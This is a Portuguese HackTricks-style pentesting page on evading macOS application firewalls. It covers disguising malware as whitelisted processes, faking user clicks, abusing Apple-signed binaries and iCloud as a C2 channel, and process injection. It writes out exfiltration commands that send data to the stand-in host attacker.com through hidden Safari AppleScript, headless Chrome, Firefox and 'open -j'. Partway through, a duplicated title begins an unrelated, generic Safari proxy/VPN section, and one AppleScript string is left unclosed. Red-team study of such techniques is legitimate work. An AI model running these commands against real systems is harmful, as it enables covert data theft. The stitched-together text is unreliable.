# Bypassando Firewalls no macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Técnicas encontradas

As seguintes técnicas foram encontradas funcionando em alguns aplicativos de firewall do macOS.

### Abusando de nomes de lista de permissões

* Por exemplo, chamando o malware com nomes de processos conhecidos do macOS, como **`launchd`**&#x20;

### Clique sintético

* Se o firewall solicitar permissão ao usuário, faça o malware **clicar em permitir**

### **Usar binários assinados pela Apple**

* Como **`curl`**, mas também outros como **`whois`**

### Domínios conhecidos da Apple

O firewall pode permitir conexões com domínios conhecidos da Apple, como **`apple.com`** ou **`icloud.com`**. E o iCloud pode ser usado como um C2.

### Bypass genérico

Algumas ideias para tentar burlar firewalls

### Verificar tráfego permitido

Saber o tráfego permitido ajudará a identificar domínios potencialmente na lista de permissões ou quais aplicativos têm permissão para acessá-los
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusando do DNS

As resoluções de DNS são feitas através do aplicativo assinado **`mdnsreponder`**, que provavelmente será permitido a entrar em contato com os servidores DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### Através de aplicativos de navegador

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Bypassando Firewalls no macOS

## Safari

O Safari é o navegador padrão do macOS e possui recursos de segurança que podem ajudar a proteger contra ataques de rede. No entanto, existem técnicas que podem ser usadas para contornar as restrições do firewall e permitir o acesso a recursos bloqueados.

### Usando um Proxy

Uma maneira de contornar o firewall é configurar um proxy no Safari. Um proxy atua como intermediário entre o navegador e a Internet, permitindo que o tráfego passe por ele sem ser bloqueado pelo firewall.

Para configurar um proxy no Safari, siga estas etapas:

1. Abra as Preferências do Safari.
2. Vá para a guia "Avançado".
3. Clique em "Alterar configurações do proxy".
4. Selecione a opção "Web Proxy (HTTP)".
5. Insira o endereço IP e a porta do proxy.
6. Clique em "OK" para salvar as configurações.

Depois de configurar o proxy, o tráfego do Safari será roteado através dele, permitindo que você acesse recursos bloqueados pelo firewall.

### Usando uma VPN

Outra maneira de contornar o firewall é usar uma VPN (Rede Virtual Privada). Uma VPN cria uma conexão segura entre o seu dispositivo e um servidor remoto, permitindo que você acesse a Internet de forma segura e contorne as restrições do firewall.

Existem várias opções de VPN disponíveis para o macOS. Você pode escolher uma VPN paga ou usar uma VPN gratuita. Para configurar uma VPN no macOS, siga as instruções fornecidas pelo provedor de VPN escolhido.

Depois de configurar a VPN, você poderá usar o Safari para acessar recursos bloqueados pelo firewall.

### Conclusão

Embora o Safari possua recursos de segurança para proteger contra ataques de rede, é possível contornar as restrições do firewall usando um proxy ou uma VPN. No entanto, é importante lembrar que contornar o firewall pode violar as políticas de segurança da rede e pode ser considerado uma atividade não autorizada. Portanto, sempre obtenha permissão adequada antes de tentar contornar o firewall.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Através de injeções de processos

Se você puder **injetar código em um processo** que tem permissão para se conectar a qualquer servidor, poderá contornar as proteções do firewall:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referências

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
